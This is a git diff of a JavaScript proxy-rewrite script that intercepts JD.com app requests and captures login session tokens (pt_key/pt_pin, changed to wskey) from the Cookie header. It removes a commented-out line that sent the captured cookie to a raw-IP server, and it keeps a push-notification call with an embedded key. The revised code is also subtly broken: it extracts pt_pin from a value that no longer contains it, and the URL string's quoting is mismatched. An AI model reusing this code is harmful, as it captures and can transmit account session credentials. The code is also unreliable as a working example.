@@ -56,12 +56,11 @@ function GetCookie() {
   const Referer = $request.headers['Referer'] || '';
   //if (!Referer) return;
   try {
-    if ($request.headers && $request.url.indexOf('https://api.m.jd.com/openUpgrade') > -1) {
+    if ($request.headers && $request.url.indexOf('https://api.m.jd.com/client.action?functionId=msgEntrance') > -1) {
       var CV = $request.headers['Cookie'] || $request.headers['cookie'];
-      if (CV.match(/(pt_key=.+?pt_pin=|pt_pin=.+?pt_key=)/)) {
-        var CookieValue = CV.match(/pt_key=.+?;/) + CV.match(/pt_pin=.+?;/);
+      if (CV.match(/(wskey=.+?)/)) {
+        var CookieValue = CV.match(/wskey=.+?;/);
         $.notify(CookieValue);
-        //$.http.get("http://47.97.63.238:5017/put/"+CookieValue)
         $.http.get("https://api.day.app/vCTP9AnrqRvYMDg6cC6cSf/更新京东/'+成功+'/?icon=https://cdn.jsdelivr.net/gh/braless/site_logo/jd_app.png")
         var UserName = CookieValue.match(/pt_pin=(.+?);/)[1];
         var DecodeName = decodeURIComponent(UserName);
